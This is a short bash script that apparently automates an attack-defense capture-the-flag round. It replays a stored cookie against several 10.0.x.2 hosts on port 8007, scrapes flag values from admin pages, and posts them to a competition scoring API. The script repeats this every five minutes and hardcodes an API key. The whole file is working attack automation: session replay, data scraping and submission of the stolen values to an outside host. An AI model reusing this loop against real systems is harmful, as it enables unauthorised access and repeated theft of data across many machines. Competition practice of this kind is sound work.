#!/bin/bash
while :
    do
    for i in  {3..4} {6..8}
    do
        echo "Trying $i at `date`"
        flag=$(curl --cookie "$(cat mcookie)" 10.0.$i.2:8007/ 2> curllog | grep admin | cut -d'>' -f3 | cut -d'<' -f1) 
        echo $flag
        curl -d 'apikey=cfe4d033170d8a56c327c620b05dc6c3b460f22de0087316d9' -d "flag=$flag" https://cyberstakesonline.com/liveapi/2/submit 2> curllog
        echo
    done
    sleep 5m
done
